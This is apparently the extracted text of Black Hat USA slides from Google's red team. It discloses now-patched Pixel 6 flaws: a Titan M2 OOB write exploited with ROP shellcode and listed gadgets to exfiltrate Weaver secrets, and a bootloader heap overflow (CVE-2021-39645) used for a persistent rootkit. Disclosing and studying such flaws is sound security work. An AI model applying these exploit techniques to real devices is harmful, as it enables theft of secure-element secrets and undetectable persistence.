Advance Identity to the state 
for step #3
Global `cbor` is set to the 
attacker-controlled value
Advance Identity to the state 
for step #5
ICstartRetrieveEntryValueRequest
Overwrite Identity 
globals
ICpushReaderCertRequest
ICgenerateSigningKeyPairRequest
Set Identity state #4
Deliver ROP shellcode 
and run it
Advance Identity to the state 
for step #6
ICstartRetrieveEntriesRequest
ICstartRetrieveEntriesRequest
Step #1:
Step #2:
Step #3:
Step #4:
Step #5:
Step #6:
Overwrite return address on 
the stack and run ROP chain
#BHUSA   @BlackHatEvents 
Information Classification: General
●
Exfiltrate Weaver’s secrets stored in the secure file 
system:
○
Weaver provides secure storage for user/platform 
secrets
○
Throttles consecutive failed verification attempts
●
Use OOB write in globals to gain code execution in Titan 
M2:
○
ROP shellcode running a sequence of arbitrary 
syscalls
Exfiltrating Weaver’s secrets from Titan M2
User
Weaver
store 
secret
retrieve 
secret
store secret & 
password in 
secure flash
secret & 
password
verify password: 
OK
valid 
password
retrieve secret
secret
retrieve 
secret
verify password:
WRONG
incorrect 
password
throttle
timeout
Flash
store data
read 
password
read 
secret
read
password
read 
secret
code execution on Titan
#BHUSA   @BlackHatEvents 
Information Classification: General
Titan Shellcode: Script
●
Each task in Titan M2 has access to a dedicated file 
system:
○
Every task has an isolated file system on the 
secure flash
○
Titan M2 kernel provides syscalls to access the 
tasks’ file system
○
Identity task cannot read/write Weaver’s files
●
Titan M2 kernel provides syscalls for raw access to 
the secure flash (e.g. flash_map_page):
○
Syscalls are subject to ACL checks
○
The Identity task is able to access these syscalls  
due to a gap in ACL policy (the gap has been 
fixed)
○
Thus, the attacker is able to read/write flash and 
parse the file system objects
// map the target flash page into memory
void *page_ptr;
flash_map_page(..., &page_ptr);                   (1)
// allocate a shared memory region to send the response to AP
struct task_response scs;
cmd_alloc_send(&scs, ...);                        (2)
// copy flash contents into the shared memory region
memcpy(scs.response_buffer, page_ptr, 2048);
// send contents of the shared memory region back to AP over SPI
cmd_app_done(&scs);                               (3)
// This forces Titan M2 to go into sleep state.
// Use this function to prevent crashing Titan M2: once
// it comes out of sleep the identity app will be restarted
// and we can start over.
usleep(...);                                      (4)
#BHUSA   @BlackHatEvents 
Information Classification: General
Titan Shellcode: Finding ROP gadgets
.text:000A44BE     lw      ra, 8+var_s24(sp)
.text:000A44C0     lw      s0, 8+var_s20(sp)
.text:000A44C2     lw      s1, 8+var_s1C(sp)
.text:000A44C4     lw      s2, 8+var_s18(sp)
.text:000A44C6     lw      s3, 8+var_s14(sp)
.text:000A44C8     lw      s4, 8+var_s10(sp)
.text:000A44CA     lw      s5, 8+var_sC(sp)
.text:000A44CC     lw      s6, 8+var_s8(sp)
.text:000A44CE     lw      s7, 8+var_s4(sp)
.text:000A44D0     lw      s8, 8+var_s0(sp)
.text:000A44D2     addi    sp, sp, 30h
.text:000A44D4     ret
.text:000B920C      mv      a7, s8
.text:000B920E      mv      a2, s4
.text:000B9210      mv      a3, s1
.text:000B9212      mv      a0, s6
.text:000B9214      mv      a1, s5
.text:000B9216      jal     eicOpsValidateAuthToken
.text:000B921A      beqz    a0, loc_B91CC
.text:000B921C      sw      s6, 60h(s0)
.text:000B9220      sw      s5, 64h(s0)
.text:000B9224      sw      s4, 68h(s0)
.text:000B9228      sw      s1, 6Ch(s0)
.text:000B922A      sw      s8, 70h(s0)
.text:000B922E      sw      s7, 74h(s0)
.text:000B9232      sw      s2, 78h(s0)
.text:000B9236      sw      s3, 7Ch(s0)
.text:000B923A      j       loc_B91CE
.text:000B91CE loc_B91CE:
.text:000B91CE      lw      ra, 38h+var_s24(sp)
.text:000B91D0      lw      s0, 38h+var_s20(sp)
.text:000B91D2      lw      s1, 38h+var_s1C(sp)
.text:000B91D4      lw      s2, 38h+var_s18(sp)
.text:000B91D6      lw      s3, 38h+var_s14(sp)
.text:000B91D8      lw      s4, 38h+var_s10(sp)
.text:000B91DA      lw      s5, 38h+var_sC(sp)
.text:000B91DC      lw      s6, 38h+var_s8(sp)
.text:000B91DE      lw      s7, 38h+var_s4(sp)
.text:000B91E0      lw      s8, 38h+var_s0(sp)
.text:000B91E2      addi    sp, sp, 60h
.text:000B91E4      ret
.text:000C5922      mv      a0, s0
.text:000C5924      j       loc_C590E
.text:000C590E      lw      ra, 4+var_s8(sp)
.text:000C5910      lw      s0, 4+var_s4(sp)
.text:000C5912      lw      s1, 4+var_s0(sp)
.text:000C5914      addi    sp, sp, 10h
.text:000C5916      ret
.text:000A81A4      lw      ra, 20h+var_4(sp)
.text:000A81A6      lw      s0, 20h+var_8(sp)
.text:000A81A8      addi    sp, sp, 20h
.text:000A81AA      ret
Gadget #1: load values of saved 
registers s0-s8 and ra from stack
Gadget #2: initialize argument 
registers a1-a3 using saved registers
Gadget #3: invoke target syscall 
(register a0 contains syscall number)
Gadget #4: start over
#BHUSA   @BlackHatEvents 
Code Execution in Titan M2: Demo
#BHUSA   @BlackHatEvents 
… And Pixel 6 Was Made More Secure!
All identified issues in Titan M2 are mitigated!
Fuzzers continuously run internally on ClusterFuzz.
#BHUSA   @BlackHatEvents 
Android 
BootLoader (ABL) 
Code Execution
#BHUSA   @BlackHatEvents 
Information Classification: General
S-EL1
S-EL0
NS-EL1
EL3
BootROM
PBL/BL1
ABL
Secure 
Monitor
Trusty
Trusty Apps
Android 
Kernel
Android Bootloader (ABL)
#BHUSA   @BlackHatEvents 
Information Classification: General
Important in Android boot chain
Android ABL Overview
Lockdown security configurations 
before kernel is loaded
AVB implementation
Android kernel loading
Recovery environment (fastboot)
Bigger attack surface 
Recovery interface is a historic 
source of security issues
Dealing with arbitrary user input via 
fastboot implementation
Updating/verifying Android boot 
configurations
Kernel signature verification and 
loading
#BHUSA   @BlackHatEvents 
Information Classification: General
ABL Code Execution
●
Evaluation approaches
○
Manual code review
●
Vulnerabilities
○
CVE-2021-39645: Heap OOB write in gpt_load_gpt_data
○
CVE-2021-39684: Incorrect configured RWX region in ABL
●
Prerequisites
○
Write access to /dev/block/by-name/sd{a-d} devices
○
Needs root privilege or extensive physical access
#BHUSA   @BlackHatEvents 
Information Classification: General
Missing Size Check ⇒ OOB Write!
Pseudo code:
int gpt_load_gpt_data() {
    …
    gpt_header_t hdr;
    if (!io_read(&hdr)) { return -1; }
    if (hdr.entry_count > MAX_ENTRY_COUNT) { return -1; }
    gpt_entries = (gpt_entry_t*)malloc(sizeof(gpt_entry_t) * 
MAX_ENTRY_COUNT);
    size_t size = hdr.entry_count * hdr.entry_size;
    if (!io_read(gpt_entries, size)) { return -1;}
    …
    return 0;
}
typedef struct {
    …
    uint32_t entry_count;
    uint32_t entry_size;
    …
} gpt_header_t;
typedef struct {
    …
} gpt_entry_t;
#BHUSA   @BlackHatEvents 
Information Classification: General
size=0x10
p_next=0x????
Exploiting ABL OOB Write Issue
size=0x1000
p_next=0x????
HEAP
STACK
gpt_entries
Call Frame
LR, …
LR, …
Payload
RWX Region
ROP
#BHUSA   @BlackHatEvents 
Information Classification: General
ABL Code Execution
●
Impact
○
Arbitrary code execution in the context of bootloader at EL1 (Non-Secure)
○
Full persistence on the vulnerable device for the privileged attacker (persistent rooting of Pixel 
6)
■
Survives reboots and even OTA updates
○
The device runs the malicious kernel while attestation services believe the platform’s integrity 
is not violated
■
The exploitation happens before Keymaster is initialized (both on Trusty side and on 
Titan M2)
■
The exploit can spoof AVB measurements (i.e. boot hash, OS patch level, unlock status)
○
Malicious kernel can use Keymaster-protected secrets
#BHUSA   @BlackHatEvents 
Information Classification: General
Demo: ABL Rootkit
#BHUSA   @BlackHatEvents 
Information Classification: General
Demo: ABL Rootkit
#BHUSA   @BlackHatEvents 
●
CVEs used:
○
ABL OOB write: CVE-2021-39645 – High
○
ABL RWX memory configuration: CVE-2021-39684 – High 
●
Patch release date: December 2021
Mitigation for the ABL Code Execution
#BHUSA   @BlackHatEvents 
Conclusion
#BHUSA   @BlackHatEvents 
Information Classification: General
Red Team to Secure Pixel
Fuzzing bare-metal != easy
Your Pixel 6 is Secure
Findings help make Pixel more secure
Red Team + SDL Integration
Invest in Continuous
Fuzzing
Fuzzers continuously run on 
centralized infrastructure and 
discover new issues 
This helps us scale
HAL and  good compartmentalization 
makes fuzzing low-level code easier
Mitigations
Several of the targets evaluated in this 
review were missing mitigations: 
ASLR, CFI, etc.
Pixel 6 is the most secure Pixel yet
Finding bugs are normal
Transparency is good; community 
grows from knowledge sharing
Many Google teams came together to 
prioritize remediation
We’re never done! The team 
continues testing new features prior 
to release
Concluding Thoughts
#BHUSA   @BlackHatEvents 
Thank You!
Questions?